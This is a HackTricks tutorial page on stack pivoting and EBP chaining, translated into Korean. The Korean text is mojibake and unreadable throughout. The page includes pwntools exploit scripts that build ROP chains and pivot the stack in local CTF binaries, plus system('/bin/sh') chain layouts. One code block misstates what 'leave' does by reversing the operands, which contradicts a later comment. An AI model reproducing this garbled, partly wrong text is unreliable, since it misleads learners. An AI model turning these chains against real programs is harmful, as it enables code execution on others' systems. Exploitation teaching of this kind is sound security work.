# ìŠ¤íƒ í”¼ë²—íŒ… - EBP2Ret - EBP ì²´ì´ë‹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.**

</details>

## ê¸°ë³¸ ì •ë³´

ì´ ê¸°ìˆ ì€ **ë² ì´ìŠ¤ í¬ì¸í„° (EBP)**ë¥¼ ì¡°ì‘í•˜ì—¬ **EBP ë ˆì§€ìŠ¤í„°ì™€ `leave; ret` ëª…ë ¹ì–´ ì‹œí€€ìŠ¤ë¥¼ ì‹ ì¤‘í•˜ê²Œ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ í•¨ìˆ˜ì˜ ì‹¤í–‰ì„ ì—°ê²°í•˜ëŠ” ëŠ¥ë ¥ì„ ì•…ìš©**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

`leave`ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë‹¤ìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:
```
mov       ebp, esp
pop       ebp
ret
```
**EBPê°€ ìŠ¤íƒì— ìˆê¸° ë•Œë¬¸ì—** EIP ì´ì „ì— ìˆìœ¼ë¯€ë¡œ ìŠ¤íƒì„ ì œì–´í•˜ì—¬ EBPë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### EBP2Ret

ì´ ê¸°ìˆ ì€ **EBP ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆì§€ë§Œ EIP ë ˆì§€ìŠ¤í„°ë¥¼ ì§ì ‘ì ìœ¼ë¡œ ë³€ê²½í•  ë°©ë²•ì´ ì—†ì„ ë•Œ íŠ¹íˆ ìœ ìš©**í•©ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ì‹¤í–‰ì„ ë§ˆì¹˜ë©´ì„œ ë™ì‘ì„ í™œìš©í•©ë‹ˆë‹¤.

`fvuln`ì˜ ì‹¤í–‰ ì¤‘ì— ìŠ¤íƒì— **ê°€ì§œ EBP**ë¥¼ ì£¼ì…í•˜ì—¬ ì…¸ì½”ë“œ ì£¼ì†Œê°€ ìˆëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê°€ë¦¬í‚¤ë„ë¡ ì„¤ì •í•˜ë©´(4ë°”ì´íŠ¸ë¥¼ `pop` ì‘ì—…ì„ ê³ ë ¤í•˜ì—¬ ë”í•œ ê°’), ê°„ì ‘ì ìœ¼ë¡œ EIPë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `fvuln`ì´ ë°˜í™˜ë˜ë©´ ESPëŠ” ì´ ì¡°ì‘ëœ ìœ„ì¹˜ë¡œ ì„¤ì •ë˜ê³ , ì´í›„ì˜ `pop` ì‘ì—…ì€ ESPë¥¼ 4ë§Œí¼ ê°ì†Œì‹œí‚¤ë¯€ë¡œ, **ì‚¬ìš©ìê°€ ì„¤ì •í•œ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ íš¨ê³¼ì ìœ¼ë¡œ ë§Œë“­ë‹ˆë‹¤.**\
ì—¬ê¸°ì„œ **2ê°œì˜ ì£¼ì†Œë¥¼ ì•Œì•„ì•¼ í•œë‹¤ëŠ” ì **ì— ìœ ì˜í•˜ì„¸ìš”: ESPê°€ ì´ë™í•  ìœ„ì¹˜ ë° ESPê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¥¼ ì‘ì„±í•´ì•¼ í•˜ëŠ” ìœ„ì¹˜ì…ë‹ˆë‹¤.

#### ê³µê²© êµ¬ì„±

ë¨¼ì € **ì„ì˜ì˜ ë°ì´í„°/ì£¼ì†Œë¥¼ ì“¸ ìˆ˜ ìˆëŠ” ì£¼ì†Œë¥¼ ì•Œì•„ì•¼** í•©ë‹ˆë‹¤. ESPëŠ” ì—¬ê¸°ë¥¼ ê°€ë¦¬í‚¤ê³  **ì²« ë²ˆì§¸ `ret`ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, **ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í• ** `ret`ì— ì˜í•´ ì‚¬ìš©ë˜ëŠ” ì£¼ì†Œë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ìœ íš¨í•œ [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) ì£¼ì†Œ.
* **`system()`** ì£¼ì†Œ ë’¤ì— **4ë°”ì´íŠ¸ì˜ ì“°ë ˆê¸° ë°”ì´íŠ¸**ì™€ `"/bin/sh"` ì£¼ì†Œ(x86 ë¹„íŠ¸).
* **`jump esp;`** ê°€ì ¯([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) ì£¼ì†Œ ë’¤ì— ì‹¤í–‰í•  **ì…¸ì½”ë“œ** ì£¼ì†Œ.
* ì¼ë¶€ [**ROP**](../rop-return-oriented-programing/) ì²´ì¸

ì œì–´ ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ì˜ ì´ ë¶€ë¶„ì— ì´ëŸ¬í•œ ì£¼ì†Œ ì¤‘ ì–´ëŠ ê²ƒì´ë“  ì•ì— **`4`ë°”ì´íŠ¸**ê°€ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” `leave` ëª…ë ¹ì˜ `pop` ë¶€ë¶„ ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ 4ë°”ì´íŠ¸ë¥¼ ì•…ìš©í•˜ì—¬ **ë‘ ë²ˆì§¸ ê°€ì§œ EBPë¥¼ ì„¤ì •í•˜ê³  ì‹¤í–‰ì„ ê³„ì† ì œì–´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Off-By-One Exploit

ì´ ê¸°ìˆ ì˜ íŠ¹ì • ë³€í˜•ì¸ "Off-By-One Exploit"ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **EBPì˜ ê°€ì¥ ë‚®ì€ ìœ íš¨ ë°”ì´íŠ¸ë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê²½ìš°** ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê²½ìš°, **`ret`ë¡œ ì´ë™í•  ì£¼ì†Œë¥¼ ì €ì¥í•˜ëŠ” ë©”ëª¨ë¦¬ ìœ„ì¹˜**ëŠ” EBPì™€ ì²˜ìŒ ì„¸ ë°”ì´íŠ¸ë¥¼ ê³µìœ í•´ì•¼ í•˜ë¯€ë¡œ ë” ì œì•½ ì¡°ê±´ìœ¼ë¡œ ìœ ì‚¬í•œ ì¡°ì‘ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.\
ë³´í†µ ê°€ì¥ ë©€ë¦¬ ì´ë™í•˜ë ¤ë©´ ë°”ì´íŠ¸ 0x00ì„ ìˆ˜ì •í•©ë‹ˆë‹¤.

ë˜í•œ, ìŠ¤íƒì— RET ìŠ¬ë ˆë“œë¥¼ ì‚¬ìš©í•˜ê³  ì‹¤ì œ ROP ì²´ì¸ì„ ëì— ë†“ì•„ ìƒˆ ESPê°€ RET ìŠ¬ë ˆë“œ ë‚´ë¶€ë¥¼ ê°€ë¦¬í‚¤ê³  ìµœì¢… ROP ì²´ì¸ì´ ì‹¤í–‰ë  ê°€ëŠ¥ì„±ì„ ë†’ì´ëŠ” ê²ƒì´ ì¼ë°˜ì ì…ë‹ˆë‹¤.

### **EBP Chaining**

ë”°ë¼ì„œ ìŠ¤íƒì˜ `EBP` í•­ëª©ì— ì œì–´ ê°€ëŠ¥í•œ ì£¼ì†Œë¥¼ ë„£ê³  `EIP`ì— `leave; ret` ì£¼ì†Œë¥¼ ë„£ìœ¼ë©´ **`ESP`ë¥¼ ìŠ¤íƒì—ì„œ ì œì–´ ê°€ëŠ¥í•œ `EBP` ì£¼ì†Œë¡œ ì´ë™**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì œ **`ESP`**ê°€ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê³  ì‹¤í–‰í•  ë‹¤ìŒ ëª…ë ¹ì´ `RET`ì¸ ìƒíƒœì…ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ ì œì–´ ê°€ëŠ¥í•œ ESP ìœ„ì¹˜ì— ë‹¤ìŒì„ ë†“ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`&(ë‹¤ìŒ ê°€ì§œ EBP)`** -> `leave` ëª…ë ¹ì˜ `pop ebp`ë¡œ ìƒˆ EBPë¥¼ ë¡œë“œí•©ë‹ˆë‹¤.
* **`system()`** -> `ret`ì— ì˜í•´ í˜¸ì¶œë©ë‹ˆë‹¤.
* **`&(leave;ret)`** -> ì‹œìŠ¤í…œì´ ì¢…ë£Œëœ í›„ í˜¸ì¶œë˜ë©°, ESPë¥¼ ê°€ì§œ EBPë¡œ ì´ë™ì‹œí‚¤ê³  ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤.
* **`&("/bin/sh")`**-> `system`ì— ëŒ€í•œ ë§¤ê°œë³€ìˆ˜

ê¸°ë³¸ì ìœ¼ë¡œ ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì œì–´í•˜ê¸° ìœ„í•´ ì—¬ëŸ¬ ê°€ì§œ EBPë¥¼ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” [ret2lib](../rop-return-oriented-programing/ret2lib/)ì™€ ìœ ì‚¬í•˜ì§€ë§Œ, ëª…ë°±í•œ ì´ì ì€ ì—†ì§€ë§Œ ì¼ë¶€ íŠ¹ìˆ˜í•œ ê²½ìš°ì— í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ì—¬ê¸°ì—ëŠ” ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ **ìŠ¤íƒ ëˆ„ì¶œ**ì„ í†µí•´ ì´ê¸°ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” [**ë„ì „ ê³¼ì œ ì˜ˆì œ**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í˜ì´ì§€ì˜ ìµœì¢… í˜ì´ë¡œë“œì…ë‹ˆë‹¤:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBPê°€ ì‚¬ìš©ë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŒ

[**ì´ ê²Œì‹œë¬¼ì—ì„œ ì„¤ëª…í•œëŒ€ë¡œ**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), ì¼ë¶€ ìµœì í™”ë¡œ ì»´íŒŒì¼ëœ ì´ì§„ íŒŒì¼ì˜ ê²½ìš° **EBPëŠ” ESPë¥¼ ì œì–´í•˜ì§€ ëª»í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ**, EBPë¥¼ ì œì–´í•˜ì—¬ ì‘ë™í•˜ëŠ” ì–´ë–¤ ì•…ìš©ë„ ì‹¤ì œë¡œ íš¨ê³¼ê°€ ì—†ê¸° ë•Œë¬¸ì— ì‹¤íŒ¨í•  ê²ƒì…ë‹ˆë‹¤.\
ì´ëŠ” **í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ê°€** ìµœì í™”ëœ ê²½ìš° ë³€ê²½ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

* **ìµœì í™”ë˜ì§€ ì•ŠìŒ:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **ìµœì í™”ë¨:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSPë¥¼ ì œì–´í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•

### **`pop rsp`** ê°€ì ¯

[**ì´ í˜ì´ì§€**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp)ì—ì„œ ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•œ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„ì „ ê³¼ì œì—ì„œëŠ” 2ê°œì˜ íŠ¹ì • ì¸ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì•¼ í–ˆìœ¼ë©° **`pop rsp` ê°€ì ¯**ì´ í•„ìš”í–ˆìœ¼ë©° **ìŠ¤íƒì—ì„œì˜ ëˆ„ì¶œ**ì´ ìˆì—ˆìŠµë‹ˆë‹¤:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp ê°€ì ¯
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

ì—¬ê¸°ì„œ ret2esp ê¸°ìˆ ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## ì°¸ê³  ìë£Œ ë° ë‹¤ë¥¸ ì˜ˆì‹œ

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 ë¹„íŠ¸, ret sledë¡œ ì‹œì‘í•˜ëŠ” rop ì²´ì¸ì„ ì‚¬ìš©í•œ off by one exploitation
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 ë¹„íŠ¸, relro, canary, nx ë° pieê°€ ì—†ìŠµë‹ˆë‹¤. í”„ë¡œê·¸ë¨ì€ ìŠ¤íƒ ë˜ëŠ” pieì˜ leakë¥¼ í—ˆìš©í•˜ê³  qwordì˜ WWWë¥¼ ì œê³µí•©ë‹ˆë‹¤. ë¨¼ì € ìŠ¤íƒ leakì„ ê°€ì ¸ì™€ì„œ WWWë¥¼ ì‚¬ìš©í•˜ì—¬ pie leakì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ `.fini_array` í•­ëª©ì„ ë‚¨ìš©í•˜ê³  `__libc_csu_fini`ë¥¼ í˜¸ì¶œí•˜ì—¬ "eternal" ì“°ê¸°ë¥¼ ë§Œë“¤ì–´ ROP ì²´ì¸ì„ .bssì— ì“°ê³  RBPë¡œ í”¼ë²—íŒ…í•©ë‹ˆë‹¤.

## ARM64

ARM64ì—ì„œ í•¨ìˆ˜ì˜ **í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸**ëŠ” **SP ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ ìŠ¤íƒì— ì €ì¥í•˜ê³  ê²€ìƒ‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ìŠ¤íƒ ë‚´ë¶€ì˜ ì¼ë¶€ ë°ì´í„°ë¥¼ ë®ì–´ì“°ëŠ” ê²ƒìœ¼ë¡œ SP ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ ì œì–´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
